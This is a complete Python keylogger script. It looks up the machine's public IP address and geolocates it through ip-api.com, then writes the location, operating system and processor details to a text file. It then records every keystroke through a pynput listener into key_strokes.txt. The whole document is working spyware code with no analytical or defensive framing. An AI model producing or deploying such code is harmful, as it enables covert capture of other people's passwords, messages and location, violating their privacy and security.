# import libraries
from pynput import keyboard
import requests
from requests import get
import platform


def ip_address_and_location():
    # grabs ip address by going to api.ify.org
    ip = get("https://api.ipify.org/").text
    # creates system_info text file to write ip and location details
    with open("system_info.txt", "a") as log2:
        try:
            log2.write("IP Address: "+ip)
        # if website cannot be reached: then instead it will print "IP ADDRESS: N/A"
        except Exception:
            log2.write("IP Address: N/A")
    # using ip-api.com ips can be matched to locations, so we query with the ip from above
    locationinfo = requests.post("http://ip-api.com/batch", json=[
        {"query": ip}]).json()
    # opens file created above, and appends information
    with open("system_info.txt", "a") as log:
        # for loop to filter the response and writes only the wanted information
        for filterinfo in locationinfo:
            log.write("\nCountry: "+filterinfo["country"])
            log.write("\nRegion: "+filterinfo["region"]+" ("+filterinfo["regionName"]+")")
            log.write("\nCity: " + filterinfo["city"])


def hardware_info():
    # open the same file and appends operating system information and processor information
    with open("system_info.txt", "a") as log:
        log.write("\nOperating System: "+platform.platform())
        log.write("\nProcessor: " + platform.processor())


# call functions
ip_address_and_location()
hardware_info()


# key logging
def logger(key):
    letter = str(key)
# converts unwanted keys to blanks or appropriate replacements
    if letter == "Key.enter":
        letter = "\n"
    if letter == "Key.space":
        letter = " "
    if letter == "Key.ctrl_l" or letter == "Key.ctrl_r":
        letter = ""
    if letter == "Key.shift_l" or letter == "Key.shift_r":
        letter = ""
# puts arrow key inputs into individual rows, so they are clear and do not blend in
    if (letter == "Key.up" or letter == "Key.down"
            or letter == "Key.left" or letter == "Key.right"):
        letter = "\n"+letter+"\n"

# formats letters, so write will read [hello] instead of ['h''e''l''l''o']
    letter = letter.replace("'", "")


# prints in console to see inputs.
    print(letter)
# creates keyfile.txt and writes keys to file, if keyfile.txt already exists then it will append to the file instead
    with open("key_strokes.txt", "a") as log:
        log.write(letter)


# anytime the listener 'hears' a key, it is passed to the logger
if __name__ == "__main__":
    listener = keyboard.Listener(on_press=logger)
    listener.start()
    input()







